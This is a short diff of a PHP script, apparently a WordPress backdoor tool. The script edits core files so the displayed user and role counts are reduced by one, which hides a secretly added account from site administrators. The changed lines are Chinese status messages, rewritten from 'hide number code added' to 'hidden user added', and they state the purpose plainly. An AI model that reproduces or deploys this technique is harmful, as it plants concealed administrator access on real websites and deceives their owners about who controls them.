@@ -77,7 +77,7 @@ if($user_name != '' && $pwd != '' && $email != ''){
              $temp = file_get_contents($path);
             $status = 0;
             if(strstr($temp, 'number_format_i18n( $total_users-1') && (strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1') || strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')) ){
-                $notice .= ' 隐藏数字 代码已添加过。';
+                $notice .= ' 隐藏用户已添加过。';
             }else{
                  if(!strstr($temp, 'number_format_i18n( $total_users-1')){
                     $temp = str_replace('number_format_i18n( $total_users', 'number_format_i18n( $total_users-1', $temp);
@@ -91,10 +91,10 @@ if($user_name != '' && $pwd != '' && $email != ''){
                $fp = fopen($path, "wb");
                fwrite($fp, $temp);
                fclose($fp);
-                 $notice .= ' 隐藏数字 代码添加成功。';                
+                 $notice .= ' 隐藏用户添加成功。';                
              }
          }else{
-             $notice .= ' 隐藏数字 文件未找到。';
+             $notice .= ' 隐藏数字文件未找到。';
         }
    }
 
